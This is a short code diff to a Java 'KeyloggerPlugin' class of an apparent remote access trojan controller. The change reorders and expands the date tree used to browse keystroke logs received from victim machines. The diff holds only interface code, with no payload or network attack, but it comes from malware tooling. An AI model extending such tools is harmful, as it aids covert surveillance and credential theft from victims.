@@ -79,26 +79,29 @@ public class KeyloggerPlugin extends RATPlugin {
 			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
 						
 			panel.getRoot().removeAllChildren();
-			panel.getTree().expandRow(0);
 			
 			int years = dis.readInt();
 			
 			for (int i = 0; i < years; i++) {
 				DefaultMutableTreeNode year = new DefaultMutableTreeNode(dis.readUTF());
-				panel.getRoot().add(year);
+				panel.getRoot().insert(year, 0);
 				
 				int months = dis.readInt();
 				
 				for (int l = 0; l < months; l++) {
 					DefaultMutableTreeNode month = new DefaultMutableTreeNode(dis.readUTF());
-					year.add(month);
+					year.insert(month, 0);
 					
 					int days = dis.readInt();
 					for (int m = 0; m < days; m++) {
 						DefaultMutableTreeNode day = new DefaultMutableTreeNode(dis.readUTF());
-						month.add(day);
+						month.insert(day, 0);
 					}
 				}
+			}
+			
+			for (int i = 0; i < panel.getTree().getRowCount(); i++) {
+				panel.getTree().expandRow(i);
 			}
 		} else if (event.getPacket().getHeader() == LOG_HEADER) {
 			
